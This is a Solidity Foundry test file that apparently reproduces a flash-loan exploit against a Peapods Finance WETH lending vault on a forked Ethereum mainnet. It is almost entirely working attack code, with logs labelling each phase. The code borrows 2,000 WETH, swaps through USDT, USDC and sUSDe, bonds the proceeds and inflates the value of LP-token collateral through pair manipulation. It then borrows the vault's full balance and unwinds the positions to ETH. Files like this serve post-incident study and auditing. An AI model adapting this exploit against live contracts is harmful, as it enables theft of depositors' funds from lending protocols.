// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

interface IUnknownEntity {
    function collateralContract() external view returns (address);
    function asset() external view returns (address);
    function stakingToken() external view returns (address);
}

interface IPod is IERC20 {
    function collateralContract() external view returns (address);
    function asset() external view returns (address);
    function stakingToken() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function redeem(
        uint256 _shares,
        address _receiver,
        address _owner
    ) external returns (uint256 _assets);

    function convertToAssets(
        uint256 shares
    ) external view returns (uint256 assets);

    function deposit(
        uint256 amount,
        address recipient
    ) external returns (uint256 shares);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function stake(address user, uint256 amount) external;

    function exchangeRateInfo()
        external
        view
        returns (ExchangeRateInfo memory exchangeRateInfo);

    function borrowAsset(
        uint256 amount,
        uint256 collateralAmount,
        address receiver
    ) external returns (uint256 shares);

    function addInterest(
        bool _returnAccounting
    )
        external
        returns (
            uint256,
            uint256,
            uint256,
            CurrentRateInfo memory,
            VaultAccount memory,
            VaultAccount memory
        );
    function userCollateralBalance(address) external returns (uint256);
    function userBorrowShares(address) external returns (uint256);
    function totalBorrow() external returns (VaultAccount memory);
    function removeCollateral(
        uint256 _collateralAmount,
        address _receiver
    ) external;

    function unstake(uint256) external;
}

struct CurrentRateInfo {
    uint32 lastBlock;
    uint32 feeToProtocolRate; // Fee amount 1e5 precision
    uint64 lastTimestamp;
    uint64 ratePerSec;
    uint64 fullUtilizationRate;
}

struct VaultAccount {
    uint128 amount; // Total amount, analogous to market cap
    uint128 shares; // Total shares, analogous to shares outstanding
}

struct ExchangeRateInfo {
    address oracle;
    uint256 maxOracleDeviation;
    uint256 lastTimestamp;
    uint256 lowExchangeRate;
    uint256 highExchangeRate;
}

interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface ILendingAssetVault {
    function vaultDeposits(address vault) external view returns (uint256);
    function vaultMaxAllocation(address vault) external view returns (uint256);
    function totalAvailableAssetsForVault(
        address vault
    ) external view returns (uint256);
}

// Deposit token and receive Pod token
interface IPeapodBondManager is IERC20 {
    function bond(address token, uint256 amount, uint256 minAmountOut) external;
    function totalAssets(
        address asset
    ) external view returns (uint256 totalManagedAssets);

    function debond(uint256, address[] memory, uint8[] memory) external;
}

interface IaspTKNMinimalOracle {
    function getPrices() external view returns (bool, uint256, uint256);
}

contract PeapodsFinanceTest is Test {
    ExploitContract public exploitContract;

    function setUp() public {
        vm.createSelectFork("mainnet", 22873986 - 1);
        exploitContract = new ExploitContract();
    }

    function testExploit() public {
        exploitContract.executeFlashLoan();
    }
}

contract ExploitContract {
    IMorphoBuleFlashLoan public morphoBuleFlashLoan;
    IERC20 public weth;
    IPod public mainVault; // Primary lending vault for WETH
    IPod public collateralAssetVault; // Vault for wrapped collateral assets
    IPod public stakingVault; // Vault for staked LP tokens
    ILendingAssetVault public lendingAssetVault;
    IPod public wethPod; // Pod token representing WETH deposits
    IUniswapV3Pool public wethUsdtPool;
    USDT public usdt;
    ICurvePool public usdtToUsdcPool;
    IERC20 public crvUsdc;
    ICurvePool public usdcToSusdePool;
    IERC20 public sUSDe;
    IPeapodBondManager public bondManager;
    IUniswapV2Pair public vaultBondLpPair;
    IaspTKNMinimalOracle public priceOracle;
    IERC20 public bondToken;
    IaspTKNMinimalOracle public priceOracleForBeforeAttack; // Price Oracle for Before Attack, check normal price

    uint256 public swapCallbackCount;

    constructor() {
        morphoBuleFlashLoan = IMorphoBuleFlashLoan(
            0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb
        );
        weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // WETH address on Ethereum mainnet
        mainVault = IPod(
            0x2e4CBEc7f29cb74a84511119757FF3CE1ef38271 // Main WETH lending vault
        );

        collateralAssetVault = IPod(0x1Bb6A15AC2A31a2ae471D78A8212c483974f5756);

        stakingVault = IPod(0x65d0a3BCd899c6EE24ABb00cB44E59fc6c71D728);

        lendingAssetVault = ILendingAssetVault(
            0x9a42e1bEA03154c758BeC4866ec5AD214D4F2191
        );

        wethPod = IPod(
            0xD1538A9d69801E57c937F3C64d8C4F57d2967257 // WETH Pod token
        );

        wethUsdtPool = IUniswapV3Pool(
            0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b // WETH/USDT Uniswap V3 Pool
        );

        usdt = USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7); // USDT address on Ethereum mainnet

        usdtToUsdcPool = ICurvePool(
            0x390f3595bCa2Df7d23783dFd126427CCeb997BF4 // USDT to USDC Curve Pool
        );

        crvUsdc = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E); // USDC address on Ethereum mainnet

        usdcToSusdePool = ICurvePool(
            0x57064F49Ad7123C92560882a45518374ad982e85 // USDC to sUSDe Curve Pool
        );

        sUSDe = IERC20(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497); // sUSDe address on Ethereum mainnet

        bondManager = IPeapodBondManager(
            0x5c3aB44BBdd5D244eB7C920ACc5404080Da947D5 // Peapod Bond Manager
        );

        vaultBondLpPair = IUniswapV2Pair(
            0x96eB59e6DbEd2E7c811BCeC2c36404CeAD66a9d6 // Vault/Bond LP Pair
        );

        bondToken = IERC20(
            0x50D2aCb0d9ee43c39dcf7CF694E94A0F9187491a // Bond Token
        );

        priceOracleForBeforeAttack = IaspTKNMinimalOracle(
            0x734D211fbFfF3E293b5BD495A1661Bc7B5B4627C
        );
    }

    function onERC20Received(
        address,
        address from,
        uint256 amount,
        bytes calldata
    ) external returns (bytes4) {
        console.log("=== TOKEN RECEIVED ===");
        console.log("From: ", from);
        console.log("Amount: ", amount);
        return this.onERC20Received.selector;
    }

    function executeFlashLoan() external {
        console.log("=== PHASE 1: INITIATING FLASH LOAN ATTACK ===");
        weth.approve(address(morphoBuleFlashLoan), 2000000000000000000000);
        bytes memory flashLoanData = abi.encodePacked(
            hex"000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000002e4cbec7f29cb74a84511119757ff3ce1ef38271000000000000000000000000d1538a9d69801e57c937f3c64d8c4f57d29672570000000000000000000000009d39a5de30e57443bff2a8307a4256c8797a349700000000000000000000000000000000000000000000006c6b935b8bbd400000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000064"
        );
        console.log("Requesting 2,000 WETH flash loan from Morpho Blue...");
        morphoBuleFlashLoan.flashLoan(
            address(weth),
            2000000000000000000000,
            flashLoanData
        );

        uint256 drainAmount = weth.balanceOf(address(this));
        console.log("=== ATTACK COMPLETED ===");
        console.log("Total WETH Drained: ", drainAmount / 1e18, " WETH");

        uint256 vaultAfterTotalAvailable = lendingAssetVault
            .totalAvailableAssetsForVault(address(mainVault));
        console.log(
            "Vault Remaining Assets: ",
            vaultAfterTotalAvailable / 1e18,
            " WETH"
        );

        uint256 vaultAfterWethBalance = weth.balanceOf(address(mainVault));
        console.log(
            "Vault WETH Balance After Attack: ",
            vaultAfterWethBalance / 1e18,
            " WETH"
        );

        console.log("=== STARTING POST-ATTACK CLEANUP ===");
        afterDrain();
    }

    function afterDrain() internal {
        console.log("=== PHASE 6: POST-ATTACK LIQUIDATION ===");
        mainVault.addInterest(false);

        VaultAccount memory vaultAccount = mainVault.totalBorrow();
        console.log(
            "Total Borrowed Amount: ",
            vaultAccount.amount / 1e18,
            " WETH"
        );
        console.log("Total Borrow Shares: ", vaultAccount.shares);

        uint256 userBorrowShares = mainVault.userBorrowShares(address(this));
        console.log("Attacker Borrow Shares: ", userBorrowShares);

        uint256 userCollateralBalance = mainVault.userCollateralBalance(
            address(this)
        );
        console.log("Attacker Collateral Balance: ", userCollateralBalance);

        console.log("Checking oracle prices...");
        (bool isBadData, uint256 priceLow, uint256 priceHigh) = priceOracle
            .getPrices();
        console.log("Price Oracle Data: ", isBadData, priceLow, priceHigh);

        console.log("Removing collateral from vault...");
        // userCollateralBalance: 339561531617454665193
        // Collateral to need: 339561531617454665193 - 337407331435616895620 =  2258200181847700073
        mainVault.removeCollateral(337407331435616895620, address(this)); // LP Token value is so inflated, so exploiter can remove collateral
        uint256 removeCollateralAmount = collateralAssetVault.balanceOf(
            address(this)
        );
        console.log("Collateral Removed: ", removeCollateralAmount);

        console.log("Redeeming collateral assets...");
        uint256 redeemAmount = collateralAssetVault.redeem(
            removeCollateralAmount,
            address(this),
            address(this)
        );
        console.log("Assets Redeemed: ", redeemAmount);

        stakingVault.approve(address(stakingVault), redeemAmount);

        console.log("Unstaking LP tokens...");
        stakingVault.unstake(redeemAmount);

        uint256 unStakeAmount = vaultBondLpPair.balanceOf(address(this));
        console.log("LP Tokens Unstaked: ", unStakeAmount);

        console.log("Burning LP tokens to get underlying assets...");
        vaultBondLpPair.transfer(address(vaultBondLpPair), unStakeAmount);

        vaultBondLpPair.burn(address(this));

        uint256 bondTokenBalance = bondToken.balanceOf(address(this));
        console.log("Bond Token Balance After LP Burn: ", bondTokenBalance);

        address[] memory tokens = new address[](0);
        uint8[] memory amounts = new uint8[](0);

        console.log("Debonding tokens to recover sUSDe...");
        bondManager.debond(16497757848213765550245, tokens, amounts);

        uint256 debondedAmount = sUSDe.balanceOf(address(this));
        console.log("sUSDe Recovered from Debonding: ", debondedAmount / 1e18);

        console.log("Converting sUSDe back to USDC...");
        sUSDe.approve(address(usdcToSusdePool), debondedAmount);

        usdcToSusdePool.exchange(
            1, // sUSDe index
            0, // USDC index
            debondedAmount,
            0
        );

        uint256 crvUsdcBalance = crvUsdc.balanceOf(address(this));
        console.log("USDC Balance: ", crvUsdcBalance / 1e6);

        console.log("Converting USDC to USDT...");
        crvUsdc.approve(address(usdtToUsdcPool), crvUsdcBalance);

        usdtToUsdcPool.exchange(
            1, // USDC index
            0, // USDT index
            crvUsdcBalance,
            0 // min amount out
        );

        uint256 exchangeAmount = usdt.balanceOf(address(this));
        console.log("USDT Balance: ", exchangeAmount / 1e6);

        console.log("Converting USDT back to WETH...");
        usdt.approve(address(wethUsdtPool), exchangeAmount);

        (int256 amount0, int256 amount1) = wethUsdtPool.swap(
            address(this),
            false,
            int256(exchangeAmount),
            uint160(1461446703485210103287273052203988822378723970341),
            ""
        );
        console.log("USDT to WETH swap - Amount0: ", amount0);
        console.log("USDT to WETH swap - Amount1: ", amount1);

        uint256 wethBalanceAfterSwap = weth.balanceOf(address(this));
        console.log(
            "Final WETH Balance: ",
            wethBalanceAfterSwap / 1e18,
            " WETH"
        );

        console.log("Converting WETH to ETH...");
        weth.withdraw(wethBalanceAfterSwap);
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) external {
        require(msg.sender == address(wethUsdtPool), "Unauthorized callback");

        if (swapCallbackCount == 0) {
            console.log("=== SWAP CALLBACK 1: WETH Payment ===");
            console.log("WETH Amount Required: ", uint256(amount0Delta) / 1e18);
            weth.transfer(address(wethUsdtPool), uint256(amount0Delta));
            swapCallbackCount++;
            return;
        }

        if (swapCallbackCount == 1) {
            console.log("=== SWAP CALLBACK 2: USDT Payment ===");
            console.log("USDT Amount Required: ", uint256(amount1Delta) / 1e6);
            swapCallbackCount++;
            usdt.transfer(address(wethUsdtPool), uint256(amount1Delta));
            return;
        }
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        console.log("=== PHASE 2: FLASH LOAN RECEIVED - EXECUTING ATTACK ===");
        (
            bool isBadData,
            uint256 priceLow,
            uint256 priceHigh
        ) = priceOracleForBeforeAttack.getPrices();

        console.log(
            "Before Attack Price Oracle Data: ",
            isBadData,
            priceLow,
            priceHigh
        );

        uint256 lendingAssetVaultDeposits = lendingAssetVault.vaultDeposits(
            address(mainVault)
        );
        console.log(
            "Current Vault Deposits: ",
            lendingAssetVaultDeposits / 1e18,
            " WETH"
        );

        uint256 maxAllocation = lendingAssetVault.vaultMaxAllocation(
            address(mainVault)
        );
        console.log("Max Vault Allocation: ", maxAllocation / 1e18, " WETH");

        console.log("=== PHASE 2A: INITIAL WETH DEPOSIT TO POD ===");
        weth.approve(address(wethPod), 2000000000000000000000);

        wethPod.deposit(1999999999999999999000, address(this));
        uint256 podBalance = wethPod.balanceOf(address(this));
        console.log("Pod Tokens Received: ", podBalance);

        // This trigger update vault information in wethPod
        uint256 redeemAmount = wethPod.redeem(
            podBalance,
            address(this),
            address(this)
        );
        console.log("WETH Redeemed from Pod: ", redeemAmount / 1e18, " WETH");

        uint256 totalAvailableAssets = lendingAssetVault
            .totalAvailableAssetsForVault(address(mainVault));
        console.log(
            "Total Available Assets After Pod Interaction: ",
            totalAvailableAssets / 1e18,
            " WETH"
        );

        uint256 vaultWETHBalance = weth.balanceOf(address(mainVault));
        console.log(
            "Main Vault WETH Balance: ",
            vaultWETHBalance / 1e18,
            " WETH"
        );

        console.log("=== PHASE 2B: TOKEN SWAPPING CHAIN ===");
        console.log("Step 1: Converting WETH to USDT via Uniswap V3...");
        (int256 amount0, int256 amount1) = wethUsdtPool.swap(
            address(this),
            true,
            int256(7844854479788826942),
            uint160(4295128740),
            ""
        );
        console.log("WETH to USDT swap - Amount0: ", amount0);
        console.log("WETH to USDT swap - Amount1: ", amount1);

        uint256 usdtBalance = usdt.balanceOf(address(this));
        console.log("USDT Balance After Swap: ", usdtBalance / 1e6, " USDT");

        console.log("Step 2: Converting USDT to USDC via Curve...");
        usdt.approve(address(usdtToUsdcPool), usdtBalance);

        usdtToUsdcPool.exchange(
            0, // USDT index
            1, // USDC index
            usdtBalance,
            0 // min amount out
        );

        uint256 crvUsdcBalance = crvUsdc.balanceOf(address(this));
        console.log(
            "USDC Balance After Exchange: ",
            crvUsdcBalance / 1e6,
            " USDC"
        );

        console.log("Step 3: Converting USDC to sUSDe via Curve...");
        crvUsdc.approve(address(usdcToSusdePool), crvUsdcBalance);

        usdcToSusdePool.exchange(
            0, // USDC index
            1, // sUSDe index
            crvUsdcBalance,
            0 // min amount out
        );

        uint256 sUSDeBalance = sUSDe.balanceOf(address(this));
        console.log(
            "sUSDe Balance After Exchange: ",
            sUSDeBalance / 1e18,
            " sUSDe"
        );

        console.log("=== PHASE 3: BOND CREATION ===");
        sUSDe.approve(address(bondManager), sUSDeBalance);

        bondManager.bond(
            address(sUSDe),
            sUSDeBalance,
            0 // min amount out
        );

        console.log(
            "Bond Manager Total Assets: ",
            bondManager.totalAssets(address(sUSDe)) / 1e18,
            " sUSDe"
        );
        console.log(
            "Bond Tokens Received: ",
            bondManager.balanceOf(address(this))
        );

        console.log("=== PHASE 4: LP MANIPULATION ===");
        bondManager.transfer(address(vaultBondLpPair), 1);

        (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        ) = vaultBondLpPair.getReserves();
        console.log(
            "Before LP manipulation LP Pair Reserves - Reserve0: ",
            reserve0 / 1e18,
            "Reserve1: ",
            reserve1 / 1e18
        );

        require(
            vaultBondLpPair.token0() == address(mainVault),
            "Token0 should be main vault"
        );

        console.log(
            "WETH Balance Before Vault Operations: ",
            weth.balanceOf(address(this)) / 1e18,
            " WETH"
        );

        console.log("=== PHASE 5: COLLATERAL AMPLIFICATION ===");
        uint256 share = mainVault.convertToAssets(7276750401109014724);
        console.log("Shares to Convert: ", share / 1e18, " WETH equivalent");

        weth.approve(address(mainVault), share);

        uint256 vaultShares = mainVault.deposit(share, address(this));
        console.log("Main Vault Shares Received: ", vaultShares);

        console.log(
            "Main Vault Balance Before Transfer: ",
            mainVault.balanceOf(address(this))
        );

        console.log("Transferring vault tokens to LP pair...");
        mainVault.transfer(
            address(vaultBondLpPair),
            mainVault.balanceOf(address(this))
        );

        console.log(
            "Bond Manager Balance Before Transfer: ",
            bondManager.balanceOf(address(this))
        );

        console.log("Transferring bond tokens to LP pair...");
        bondManager.transfer(
            address(vaultBondLpPair),
            bondManager.balanceOf(address(this))
        );
        console.log(
            "Bond Manager Balance After Transfer: ",
            bondManager.balanceOf(address(this))
        );

        console.log("Minting LP tokens...");
        uint256 mintAmount = vaultBondLpPair.mint(address(this));
        console.log("LP Tokens Minted: ", mintAmount);

        (
            uint112 afterReserve0,
            uint112 afterReserve1,
            uint32 afterBlockTimestampLast
        ) = vaultBondLpPair.getReserves();
        console.log(
            "After LP manipulation LP Pair Reserves - Reserve0: ",
            afterReserve0 / 1e18,
            "Reserve1: ",
            afterReserve1 / 1e18
        );

        console.log("Staking LP tokens...");
        vaultBondLpPair.approve(address(stakingVault), mintAmount);

        IPod(stakingVault).stake(address(this), mintAmount);

        uint256 shares = IPod(stakingVault).balanceOf(address(this));
        console.log("Staking Shares Received: ", shares);

        console.log("Depositing staking shares to collateral vault...");
        IPod(stakingVault).approve(address(collateralAssetVault), shares);

        IPod(collateralAssetVault).deposit(shares, address(this));

        mintAmount = IPod(collateralAssetVault).balanceOf(address(this));
        console.log("Collateral Asset Vault Shares: ", mintAmount);

        uint256 availableAssets = lendingAssetVault
            .totalAvailableAssetsForVault(address(mainVault));
        console.log(
            "Available Assets for Borrowing: ",
            availableAssets / 1e18,
            " WETH"
        );
        console.log(
            "Main Vault WETH Balance: ",
            weth.balanceOf(address(mainVault)) / 1e18,
            " WETH"
        );

        ExchangeRateInfo memory exchangeRateInfo = IPod(mainVault)
            .exchangeRateInfo();

        priceOracle = IaspTKNMinimalOracle(exchangeRateInfo.oracle);

        console.log("Price Oracle Address: ", address(priceOracle));
        console.log("Getting current oracle prices...");
        (
            bool afterIsBadData,
            uint256 afterPriceHigh,
            uint256 afterPriceLow
        ) = priceOracle.getPrices();
        console.log(
            "Price Oracle Data: ",
            afterIsBadData,
            afterPriceLow,
            afterPriceHigh
        );

        console.log("=== PHASE 5: CRITICAL BORROW OPERATION ===");
        collateralAssetVault.approve(address(mainVault), mintAmount);

        console.log(
            "Main Vault WETH Balance Before Borrow: ",
            weth.balanceOf(address(mainVault)) / 1e18,
            " WETH"
        );

        uint256 borrowAmount = lendingAssetVault.totalAvailableAssetsForVault(
            address(mainVault)
        ) + weth.balanceOf(address(mainVault));
        console.log("Attempting to Borrow: ", borrowAmount / 1e18, " WETH");
        console.log("Using Collateral Amount: ", mintAmount);

        shares = mainVault.borrowAsset(
            borrowAmount, // borrow entire vault balance + extra
            mintAmount, // inflated collateral
            address(this)
        );
        console.log("Borrow Shares Received: ", shares);
        console.log("=== MASSIVE OVER-BORROW COMPLETED ===");

        weth.approve(address(morphoBuleFlashLoan), type(uint256).max);
        console.log("Flash loan repayment approved - attack phase complete!");
    }

    fallback() external payable {}
}
